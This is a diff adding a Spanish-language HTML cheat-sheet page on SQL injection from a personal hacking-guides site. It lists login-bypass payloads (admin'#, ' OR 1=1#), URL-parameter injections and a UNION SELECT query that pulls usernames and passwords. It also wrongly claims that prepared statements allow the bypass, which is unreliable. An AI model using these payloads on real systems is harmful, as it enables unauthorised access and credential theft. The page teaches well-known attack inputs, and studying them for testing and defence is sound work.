@@ -1,0 +1,104 @@
+<!--
+
+Código por byAd12
+
+~ Dedicatoria a: Ruth
+
+-->
+
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="robots" content="noindex">
+        <meta name="robots" content="noindex,nofollow">
+        <title>SQL - Inyección</title>
+        
+        <link rel="stylesheet" type="text/css" href="../resources/blog.css">
+    </head>
+    <body>
+        <!-- ......................................................... -->
+        <!-- ......................................................... -->
+        <div class="menu_bar" id="menu_bar">
+            <!-- BARRA DE MENÚ -->
+            <h1 class="logo" translate="no"><a href="../index.html">by<span>Ad</span>12</a></h1>
+            <ul>
+                <li><a href="../guides.html">~/Guías</a></li>
+                <li class="ocultarMOVIL"><a onclick="esconder()">./Ocultar</a></li>
+                <li><input type="color" class="NavColorCambiar" id="NavColorCambiar2" value="#222523"></li>
+            </ul>
+        </div>
+
+        <div class="gtranslate_wrapper" id="gtranslate_wrapper"></div>
+        <script>window.gtranslateSettings = {"default_language":"es","native_language_names":true,"detect_browser_language":true,"languages":["es","en","de","gl","ru"],"globe_color":"#66aaff","wrapper_selector":".gtranslate_wrapper","flag_size":16,"horizontal_position":"left","vertical_position":"top","globe_size":20}</script>
+        <script src="https://cdn.gtranslate.net/widgets/latest/globe.js" defer></script>
+        <!-- ......................................................... -->
+        <!-- ......................................................... -->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark-dimmed.min.css">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/bash.min.js"></script>
+        <script>hljs.highlightAll();</script>
+        <!-- ......................................................... -->
+        <!-- ......................................................... -->
+        <h1>SQLi</h1>
+        <h2 class="TituloSecundario" id="TituloSecundario">Structured Query Language - Inyección</h2>
+        <h2 class="TituloCreditosSuperior" id="InsertarCreditos"></h2>
+        <hr>
+        <!-- ......................................................... -->
+        <!-- ......................................................... -->
+        <p style="color: black; position: sticky; top: 0;" id="dd"></p>
+        <div class="parte1">
+            <div>
+                <h2>IMPORTANTE</h2>
+                <p>En SQL hay 2 tipos de comentarios según versiones. Podemos probar cada consulta intercambiando uno por otro:</p>
+
+                <pre class="codigo" translate="no"><code class="sql">#</code></pre>
+                <pre class="codigo" translate="no"><code class="sql">--</code></pre>
+
+            </div>
+
+            <div>
+                <h2>Formulario Log-in</h2>
+                <p>En una página web que utilice SQL como BB.DD. podemos probar a entrar como administrador (root, admin, ...) añadiendo un comentario de una de estas 2 maneras:</p>
+
+                <pre class="codigo" translate="no"><code class="sql">admin'#</code></pre>
+                
+                <p class="Expl">Y como contraseña podremos poner cualquiera ya que se omitirá el campo en la consulta SQL. Puede funcionar si el administrador no limita privilegios, no restringe carácteres en los formularios o si usa Prepared Statements.</p>
+
+                <p>Además se podría añadir a la consulta como usuario y contraseña (podemos probar con las comillas dobles: <span class="span_url">"</span>). Opciones:</p>
+
+                <pre class="codigo" translate="no"><code class="sql">' OR ''='</code></pre>
+                <pre class="codigo" translate="no"><code class="sql">' OR 1=1#</code></pre>
+                <pre class="codigo" translate="no"><code class="sql">' OR 1=1/*</code></pre>
+                <pre class="codigo" translate="no"><code class="sql">admin' OR '1'='1</code></pre>
+                <pre class="codigo" translate="no"><code class="sql">' OR EXISTS(SELECT * FROM Users) #</code></pre>
+                
+                <p class="Expl">Lo que hace es añadir a la consulta un nombre de usuario O una sentencia que siempre es verdadera, dando acceso a la BB.DD.</p>
+
+            </div>
+
+            <div>
+                <h2>URLs</h2>
+                <p>Con las URLs podemos ver a veces parámetros como <span class="span_url">?id=1</span>. Podemos probar a añadir:</p>
+
+                <pre class="codigo" translate="no"><code class="sql">1' OR '1'='1</code></pre>
+                <pre class="codigo" translate="no"><code class="sql">1' OR 1=1#</code></pre>
+                <pre class="codigo" translate="no"><code class="sql">1' OR 1=1/*</code></pre>
+                
+                <p class="Expl">Lo que hace es añadir a la consulta un nombre de usuario O una sentencia que siempre es verdadera, dando acceso a la BB.DD.</p>
+                <p>O intentos más complejos como conseguir datos de la BB.DD.:</p>
+                <pre class="codigo" translate="no"><code class="sql">1' UNION SELECT username, password FROM Users#</code></pre>
+
+            </div>
+
+        </div>
+        <!-- ......................................................... -->
+        <!-- ......................................................... -->
+        <hr>
+        <h2 class="TituloCreditosInferior"><a href="https://byAd12.pages.dev/guides" target="_blank">byAd12.pages.dev/guides</a></h2>
+        <!-- ......................................................... -->
+        <!-- ......................................................... -->
+        <script src="../resources/blog.js"></script>
+    </body>
+</html>
